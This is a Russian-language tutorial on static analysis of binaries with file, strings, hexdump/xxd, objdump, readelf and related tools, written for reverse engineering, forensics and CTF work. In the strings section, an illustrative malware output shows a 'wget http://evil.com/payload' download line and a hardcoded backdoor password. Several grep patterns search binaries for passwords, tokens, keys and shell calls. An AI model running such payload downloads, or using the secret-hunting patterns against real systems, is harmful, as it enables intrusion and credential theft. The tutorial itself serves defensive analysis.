---
title: "Анализ бинарников (file, strings, hexdump, objdump)"
date: "2026-05-11"
---

Анализ бинарных файлов - это базовый навык в реверс-инжиниринге, форензике и CTF. Четыре инструмента: `file`, `strings`, `hexdump`, `objdump` - позволяют понять что такое файл, что в нём лежит и как он устроен, без запуска.

---

## Зачем анализировать бинарники

Перед запуском неизвестного файла или при исследовании вредоносного ПО нужно понять:

- Что это вообще за файл (исполняемый, библиотека, архив, данные)
- Под какую архитектуру и ОС скомпилирован
- Какие строки и подсказки содержит
- Какие функции импортирует и экспортирует
- Какова структура секций и заголовков

Всё это можно сделать статически - без запуска файла.

---

## file - определение типа файла

`file` читает сигнатуру (magic bytes) в начале файла и определяет его тип. Не доверяет расширению.

### Базовое использование

```bash
file бинарник
file /bin/ls
file /usr/lib/libssl.so
file /etc/passwd
file archive.tar.gz
file image.png
```

### Примеры вывода

```bash
file /bin/ls
# /bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
#          dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
#          BuildID[sha1]=..., for GNU/Linux 3.2.0, stripped

file /bin/bash
# /bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
#            dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
#            for GNU/Linux 3.2.0, with debug_info, not stripped

file /etc/passwd
# /etc/passwd: ASCII text

file archive.tar.gz
# archive.tar.gz: gzip compressed data, from Unix

file image.png
# image.png: PNG image data, 1920 x 1080, 8-bit/color RGBA, non-interlaced

file document.pdf
# document.pdf: PDF document, version 1.7

file unknown_file
# unknown_file: data
```

### Расшифровка вывода ELF

```
ELF 64-bit LSB pie executable, x86-64
│   │       │   │   │           └── архитектура процессора
│   │       │   │   └──────────── тип объекта (executable, shared object, relocatable)
│   │       │   └──────────────── Position Independent Executable
│   │       └──────────────────── Little/Big Endian (порядок байт)
│   └──────────────────────────── разрядность
└──────────────────────────────── формат файла (Executable and Linkable Format)

dynamically linked   - зависит от внешних библиотек (.so)
statically linked    - всё встроено внутрь, нет внешних зависимостей
stripped             - таблица символов удалена (сложнее реверсить)
not stripped         - символы есть (имена функций, переменных)
with debug_info      - есть отладочная информация (DWARF)
```

### Флаги file

```bash
file -b файл           # краткий вывод, без имени файла
file -i файл           # MIME-тип вместо текстового описания
file -z файл           # заглянуть внутрь сжатых файлов
file -L файл           # следовать символьным ссылкам
file -s /dev/sda       # специальные файлы (блочные устройства)
file *                 # все файлы в директории
file -f list.txt       # читать имена файлов из файла

# MIME-тип
file -i /bin/ls
# /bin/ls: application/x-executable; charset=binary

file -i image.png
# image.png: image/png; charset=binary
```

### Magic bytes - как file понимает тип

```bash
# file читает первые байты файла и сверяет с базой /usr/share/misc/magic
# Примеры сигнатур:

# ELF: 7f 45 4c 46 (0x7f 'E' 'L' 'F')
# PNG: 89 50 4e 47 0d 0a 1a 0a (89 PNG \r\n ^Z \n)
# ZIP: 50 4b 03 04 ('P' 'K' 0x03 0x04)
# PDF: 25 50 44 46 ('%PDF')
# gzip: 1f 8b
# 7z:  37 7a bc af 27 1c

xxd бинарник | head -2    # посмотреть первые байты вручную
```

---

## strings - извлечение строк

`strings` находит все печатаемые строки в бинарном файле. Минимальная длина по умолчанию - 4 символа.

### Базовое использование

```bash
strings бинарник
strings /bin/ls
strings /usr/sbin/sshd
strings вредонос.bin
```

### Что можно найти

```bash
strings вредонос.bin
# /bin/sh                    - запуск шелла
# /etc/passwd                - обращение к файлу паролей
# wget http://evil.com/payload  - скачивание чего-то
# BACKDOOR_PASSWORD          - захардкоженный пароль
# SELECT * FROM users        - SQL-запрос
# UPX!                       - упаковщик UPX
# Copyright 2024 MalwareCorp - метаданные компилятора
# Mozilla/5.0                - User-Agent для маскировки
```

### Флаги strings

```bash
strings -n 8 бинарник      # минимальная длина строки 8 символов (по умолчанию 4)
strings -t x бинарник      # показать смещение в hex перед каждой строкой
strings -t d бинарник      # смещение в десятичном
strings -t o бинарник      # смещение в восьмеричном
strings -a бинарник        # сканировать весь файл (не только секцию .data)
strings -e l бинарник      # UTF-16 LE строки (Windows широкие строки)
strings -e b бинарник      # UTF-16 BE строки
strings -f бинарник        # показывать имя файла перед каждой строкой

# Показать смещение (полезно для анализа)
strings -t x /bin/ls | head -20
# 0x1234  /lib64/ld-linux-x86-64.so.2
# 0x1250  libselinux.so.1
# ...
```

### Практические паттерны

```bash
# Найти URL в бинарнике
strings бинарник | grep -E 'https?://'

# Найти IP-адреса
strings бинарник | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'

# Найти email
strings бинарник | grep -E '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'

# Найти пути к файлам
strings бинарник | grep -E '^/[a-z]'

# Найти Windows-пути
strings -e l бинарник | grep -E '^[A-Z]:\\'

# Найти Base64
strings бинарник | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'

# Найти захардкоженные пароли/ключи
strings бинарник | grep -iE 'password|passwd|secret|key|token|api'

# Посмотреть строки с контекстом
strings -t x бинарник | grep -i password

# Список импортируемых библиотек
strings бинарник | grep '\.so\.'
strings бинарник | grep '\.dll'
```

### Ограничения strings

```bash
# strings не понимает контекст - выдаёт любые последовательности ASCII
# Шум можно отфильтровать:
strings бинарник | grep -v '^[^a-zA-Z]*$'     # убрать строки без букв
strings бинарник | awk 'length > 8'            # только длинные строки

# Если файл упакован (UPX, обфусцирован) - strings покажет мало
file бинарник | grep -i upx   # проверить на упаковку
strings бинарник | grep UPX   # UPX оставляет след
# Перед анализом распаковать: upx -d бинарник
```

---

## hexdump - просмотр в hex

`hexdump` (и его вариант `xxd`) показывает содержимое файла в шестнадцатеричном представлении. Незаменим при анализе бинарных протоколов, заголовков и поиске паттернов.

### Базовое использование

```bash
hexdump файл               # стандартный вывод
hexdump -C файл            # hex + ASCII справа (самый читаемый формат)
xxd файл                   # альтернатива с похожим форматом
xxd -l 64 файл             # только первые 64 байта
```

### hexdump -C - основной режим

```bash
hexdump -C /bin/ls | head -5
# 00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
# 00000010  03 00 3e 00 01 00 00 00  d0 6e 00 00 00 00 00 00  |..>......n......|
# 00000020  40 00 00 00 00 00 00 00  90 28 01 00 00 00 00 00  |@........(......|
# 00000030  00 00 00 00 40 00 38 00  0d 00 40 00 1e 00 1d 00  |....@.8...@.....|
#
# Левый столбец:  смещение в файле (hex)
# Средние столбцы: 16 байт в hex (по 8 с пробелом посередине)
# Правый столбец: ASCII-представление (точка = непечатаемый символ)
```

### Флаги hexdump

```bash
hexdump -C файл            # hex + ASCII (каноничный формат)
hexdump -x файл            # вывод двубайтовыми словами
hexdump -d файл            # в десятичном
hexdump -o файл            # в восьмеричном
hexdump -b файл            # побайтово в восьмеричном

# Ограничить вывод
hexdump -C -n 256 файл     # первые 256 байт
hexdump -C -s 0x100 файл   # начать с байта 0x100
hexdump -C -s 512 -n 128 файл  # 128 байт начиная с байта 512
```

### xxd - мощная альтернатива

```bash
xxd файл                   # стандартный вывод
xxd -l 32 файл             # первые 32 байта
xxd -s 0x40 файл           # начать с 0x40
xxd -s -16 файл            # последние 16 байт (с конца)
xxd -c 8 файл              # 8 байт в строке вместо 16
xxd -g 1 файл              # группировать по 1 байту
xxd -g 4 файл              # группировать по 4 байта
xxd -p файл                # raw hex без форматирования (plain dump)
xxd -r файл                # reverse: hex dump обратно в бинарник
xxd -u файл                # заглавные буквы в hex

# Посмотреть ELF magic bytes
xxd -l 16 /bin/ls
# 00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
#             ^ ELF сигнатура

# Извлечь участок и конвертировать
xxd -s 0x40 -l 64 -p бинарник | tr -d '\n'  # чистый hex
```

### Практические задачи с hexdump

```bash
# Найти паттерн в бинарнике
xxd бинарник | grep '4142 4344'   # поиск "ABCD"

# Сравнить два файла
diff <(xxd файл1) <(xxd файл2)

# Патчинг байта (изменить один байт)
# 1. Смотрим смещение
xxd бинарник | grep -n 'паттерн'
# 2. Создаём патч
printf '\xNN' | dd of=бинарник bs=1 seek=OFFSET conv=notrunc
# Или через xxd:
cp бинарник бинарник.bak
echo "OFFSET: XX" | xxd -r - бинарник  # OFFSET в hex, XX - новый байт

# Посмотреть заголовок PNG
xxd -l 16 image.png
# 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR

# Посмотреть ELF заголовок (первые 64 байта)
xxd -l 64 /bin/ls

# Найти строку в hex
echo -n "password" | xxd -p
# 70617373776f7264
xxd бинарник | grep '70617373'

# Извлечь сегмент файла
dd if=бинарник of=extracted.bin bs=1 skip=1024 count=512
xxd extracted.bin
```

### Структура ELF заголовка в hexdump

```bash
xxd -l 64 /bin/ls
# 00000000: 7f45 4c46  - Magic: .ELF
# 00000004: 02         - Class: 64-bit (01=32bit, 02=64bit)
# 00000005: 01         - Data: LSB (01=little endian, 02=big endian)
# 00000006: 01         - Version: 1
# 00000007: 00         - OS/ABI: ELFOSABI_NONE (System V)
# 00000010: 0300       - Type: ET_DYN (PIE executable / shared obj)
# 00000012: 3e00       - Machine: x86-64 (0x3e)
# 00000018: xxxx       - Entry point address
# 00000020: xxxx       - Program header offset
# 00000028: xxxx       - Section header offset
```

---

## objdump - дизассемблер и анализ ELF

`objdump` - мощный инструмент для анализа объектных файлов и исполняемых ELF: показывает заголовки, секции, символы, дизассемблирует код.

### Базовое использование

```bash
objdump -f бинарник        # краткая информация о файле
objdump -h бинарник        # заголовки секций
objdump -d бинарник        # дизассемблировать код секции
objdump -D бинарник        # дизассемблировать всё
objdump -t бинарник        # таблица символов
objdump -T бинарник        # динамическая таблица символов
objdump -p бинарник        # заголовки программы (сегменты)
objdump -x бинарник        # все заголовки вместе
```

### Информация о файле

```bash
objdump -f /bin/ls
# /bin/ls:     file format elf64-x86-64
# architecture: i386:x86-64, flags 0x00000150:
# HAS_SYMS, DYNAMIC, D_PAGED
# start address 0x0000000000006ed0

# Флаги формата:
# HAS_SYMS  - есть таблица символов
# DYNAMIC   - динамически слинкован
# D_PAGED   - страничная адресация
```

### Секции (-h)

```bash
objdump -h /bin/ls
# Sections:
# Idx Name          Size      VMA               LMA               File off  Algn
#   0 .interp       0000001c  0000000000000318  0000000000000318  00000318  2**0
#   ...
#  14 .text         00012345  0000000000006ed0  0000000000006ed0  00006ed0  2**4
#  ...
#  25 .data         00000120  0000000000024000  0000000000024000  00023000  2**5
#  26 .bss          00000400  0000000000024120  0000000000024120  00023120  2**5
```

| Секция | Содержимое |
| --- | --- |
| `.text` | Исполняемый код |
| `.data` | Инициализированные глобальные переменные |
| `.bss` | Неинициализированные глобальные переменные |
| `.rodata` | Константы и строковые литералы (read-only) |
| `.plt` | Procedure Linkage Table (для динамических вызовов) |
| `.got` | Global Offset Table (адреса внешних функций) |
| `.got.plt` | GOT для PLT |
| `.interp` | Путь к динамическому линковщику |
| `.dynamic` | Динамические зависимости |
| `.symtab` | Таблица символов |
| `.strtab` | Строковая таблица (имена символов) |
| `.debug_*` | DWARF отладочная информация |

### Дизассемблирование (-d и -D)

```bash
# Дизассемблировать только секции с кодом
objdump -d бинарник

# Дизассемблировать всё (включая данные как код)
objdump -D бинарник

# Синтаксис Intel вместо AT&T (читаемее для большинства)
objdump -d -M intel бинарник

# С именами символов
objdump -d --no-show-raw-insn бинарник

# Конкретная функция (через grep)
objdump -d -M intel бинарник | grep -A 50 '<main>:'
objdump -d -M intel бинарник | grep -A 20 '<check_password>:'

# С исходным кодом (если есть debug_info)
objdump -d -S бинарник

# Вывод в файл
objdump -d -M intel бинарник > disasm.txt
```

### Пример дизассемблирования

```bash
objdump -d -M intel /bin/cat | grep -A 30 '<main>:'
# 0000000000002c10 <main>:
#     2c10: 41 57                 push   r15
#     2c12: 41 56                 push   r14
#     2c14: 41 55                 push   r13
#     2c16: 41 54                 push   r12
#     2c18: 55                    push   rbp
#     2c19: 53                    push   rbx
#     2c1a: 48 83 ec 58           sub    rsp,0x58
#     2c1e: 89 fb                 mov    ebx,edi        ; argc
#     2c20: 48 89 f5              mov    rbp,rsi        ; argv
#     ...
#     2c45: e8 b6 fb ff ff        call   2800 <fopen@plt>
#
# Формат строки:
# АДРЕС: БАЙТЫ  МНЕМОНИКА  ОПЕРАНДЫ
```

### Таблица символов (-t и -T)

```bash
# Статическая таблица символов (если не stripped)
objdump -t бинарник
# SYMBOL TABLE:
# 0000000000000000 l    df *ABS*  0000000000000000 crtstuff.c
# 0000000000006ed0 g    F .text  0000000000000023 _start
# 0000000000006f00 g    F .text  000000000000015c main
# 0000000000008090 g    F .text  00000000000000a0 check_password
#
# Формат: АДРЕС  ФЛАГИ  СЕКЦИЯ  РАЗМЕР  ИМЯ
# Флаги: l=local, g=global, F=function, O=object, f=file

# Динамическая таблица символов (импорт/экспорт)
objdump -T /bin/ls
# DYNAMIC SYMBOL TABLE:
# 0000000000000000  w   D  *UND*  0000000000000000  GLIBC_2.2.5 free
# 0000000000000000  w   D  *UND*  0000000000000000  GLIBC_2.2.5 fclose
# 0000000000000000  w   D  *UND*  0000000000000000  GLIBC_2.2.5 opendir

# Список всех функций в бинарнике
objdump -t бинарник | grep ' F '

# Только глобальные функции
objdump -t бинарник | grep 'g.*F'
```

### Заголовки программы (-p)

```bash
objdump -p /bin/ls
# Program Header:
#     PHDR off    0x0000000000000040 vaddr 0x0000000000000040 ...
#   INTERP off    0x0000000000000318 vaddr 0x0000000000000318 ...
#     LOAD off    0x0000000000000000 vaddr 0x0000000000000000 ...
#     LOAD off    0x0000000000023000 vaddr 0x0000000000024000 ...
#  DYNAMIC off    0x0000000000023e58 vaddr 0x0000000000024e58 ...

# Динамические зависимости (библиотеки)
objdump -p бинарник | grep NEEDED
# NEEDED               libselinux.so.1
# NEEDED               libc.so.6
```

### Полезные комбинации

```bash
# Полный анализ бинарника
objdump -x бинарник

# Найти все вызовы функций
objdump -d -M intel бинарник | grep 'call'

# Найти вызовы конкретной функции
objdump -d -M intel бинарник | grep 'call.*printf'

# Посмотреть секцию .rodata (строки)
objdump -s -j .rodata бинарник

# Посмотреть секцию .data
objdump -s -j .data бинарник

# Найти адрес функции
objdump -t бинарник | grep 'main'

# Дизассемблировать только .plt (для анализа импортов)
objdump -d -j .plt -M intel бинарник

# Размер секций
objdump -h бинарник | awk '/Idx/{next} {print $2, $3}' | sort -k2 -rh
```

---

## readelf - анализ ELF заголовков

`readelf` специализируется исключительно на ELF-формате и выдаёт более детальную информацию, чем `objdump`.

```bash
readelf -h бинарник        # ELF header
readelf -l бинарник        # program headers (сегменты)
readelf -S бинарник        # section headers
readelf -s бинарник        # таблица символов
readelf -d бинарник        # динамическая секция
readelf -r бинарник        # таблица релокаций
readelf -a бинарник        # всё сразу
readelf -n бинарник        # note секции (buildid и т.д.)
readelf -W бинарник        # широкий вывод (не обрезать строки)

# ELF заголовок
readelf -h /bin/ls
# ELF Header:
#   Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
#   Class:                             ELF64
#   Data:                              2's complement, little endian
#   Type:                              DYN (Position-Independent Executable file)
#   Machine:                           Advanced Micro Devices X86-64
#   Entry point address:               0x6ed0
#   ...

# Динамические зависимости
readelf -d бинарник | grep NEEDED
# 0x0000000000000001 (NEEDED)  Shared library: [libselinux.so.1]
# 0x0000000000000001 (NEEDED)  Shared library: [libc.so.6]

# Security features
readelf -s бинарник | grep -i 'canary\|stack_chk'    # stack canary
```

---

## ltrace и strace - трассировка вызовов

```bash
# ltrace - перехват вызовов библиотечных функций
ltrace ./бинарник
# strcmp(0x7fff..., "admin", "password") = -1
# printf("Wrong password\n")  = 16

ltrace -e strcmp ./бинарник        # только strcmp
ltrace -e 'str*' ./бинарник        # все функции начиная с str

# strace - перехват системных вызовов
strace ./бинарник
strace -e openat,read,write ./бинарник    # конкретные syscall
strace -f ./бинарник                       # следить за дочерними процессами
strace -o output.txt ./бинарник           # вывод в файл

# Что открывает программа
strace -e openat ./бинарник 2>&1 | grep -v 'ENOENT'

# Сетевые вызовы
strace -e trace=network ./бинарник
```

---

## nm - символы в объектных файлах

```bash
nm бинарник                # все символы
nm -D бинарник             # динамические символы
nm -u бинарник             # undefined (импорты)
nm -n бинарник             # сортировать по адресу
nm -S бинарник             # показать размер символа

# Типы символов в nm:
# T/t - .text (код), глобальный/локальный
# D/d - .data (инициализированные данные)
# B/b - .bss (неинициализированные данные)
# R/r - .rodata (константы)
# U   - undefined (внешняя зависимость)
# W/w - weak symbol

# Найти функцию
nm -D бинарник | grep malloc
nm бинарник | grep main
```

---

## ldd - зависимости библиотек

```bash
ldd бинарник               # список разделяемых библиотек
ldd -v бинарник            # подробно с версиями символов
ldd -u бинарник            # неиспользуемые зависимости

ldd /bin/ls
# linux-vdso.so.1 (0x00007fff...)
# libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x...)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x...)
# /lib64/ld-linux-x86-64.so.2 (0x...)

# Внимание: не запускайте ldd на недоверенных бинарниках!
# ldd выполняет бинарник для определения зависимостей.
# Безопасная альтернатива:
objdump -p бинарник | grep NEEDED
readelf -d бинарник | grep NEEDED
```

---

## Типичный рабочий процесс анализа

### Шаг 1 - что это такое

```bash
file неизвестный_файл
# ELF 64-bit, dynamically linked, stripped
```

### Шаг 2 - зависимости и защиты

```bash
objdump -p неизвестный_файл | grep NEEDED   # библиотеки
readelf -h неизвестный_файл                  # заголовок ELF
checksec --file=неизвестный_файл             # security features (NX, PIE, canary, RELRO)
```

### Шаг 3 - строки и артефакты

```bash
strings -t x неизвестный_файл | grep -iE 'http|password|cmd|exec|/bin/sh'
strings -n 6 неизвестный_файл | sort -u
```

### Шаг 4 - секции и символы

```bash
objdump -h неизвестный_файл                  # секции
objdump -t неизвестный_файл                  # символы (если не stripped)
objdump -T неизвестный_файл                  # динамические символы
```

### Шаг 5 - дизассемблирование

```bash
objdump -d -M intel неизвестный_файл > disasm.txt
grep -n 'call\|jmp\|cmp' disasm.txt | head -50
```

### Шаг 6 - трассировка (в безопасной среде)

```bash
strace ./неизвестный_файл 2>&1 | head -50
ltrace ./неизвестный_файл 2>&1 | head -50
```

---

## Шпаргалка - быстрый справочник

| Задача | Команда |
| --- | --- |
| Определить тип файла | `file бинарник` |
| Magic bytes | `xxd -l 16 бинарник` |
| Все строки | `strings бинарник` |
| Строки с адресами | `strings -t x бинарник` |
| Поиск URL | `strings бинарник \| grep -E 'https?://'` |
| Hex просмотр | `xxd бинарник \| head` |
| Конкретный диапазон | `xxd -s 0x40 -l 64 бинарник` |
| Секции ELF | `objdump -h бинарник` |
| Дизассемблирование | `objdump -d -M intel бинарник` |
| Конкретная функция | `objdump -d -M intel бинарник \| grep -A30 '<main>:'` |
| Символы | `objdump -t бинарник` |
| Импорты | `objdump -T бинарник` |
| Зависимости | `objdump -p бинарник \| grep NEEDED` |
| ELF заголовок | `readelf -h бинарник` |
| Всё о ELF | `readelf -a бинарник` |
| Undefined символы | `nm -u бинарник` |
| Системные вызовы | `strace бинарник` |
| Библиотечные вызовы | `ltrace бинарник` |

---

## Ссылки

- [file man page](https://man7.org/linux/man-pages/man1/file.1.html) - `man file`
- [strings man page](https://man7.org/linux/man-pages/man1/strings.1.html) - `man strings`
- [hexdump man page](https://man7.org/linux/man-pages/man1/hexdump.1.html) - `man hexdump`
- [xxd man page](https://linux.die.net/man/1/xxd) - `man xxd`
- [objdump man page](https://man7.org/linux/man-pages/man1/objdump.1.html) - `man objdump`
- [readelf man page](https://man7.org/linux/man-pages/man1/readelf.1.html) - `man readelf`
- [ELF формат спецификация](https://refspecs.linuxfoundation.org/elf/elf.pdf)
- [Linux x86 ELF - краткий справочник](https://man7.org/linux/man-pages/man5/elf.5.html) - `man 5 elf`
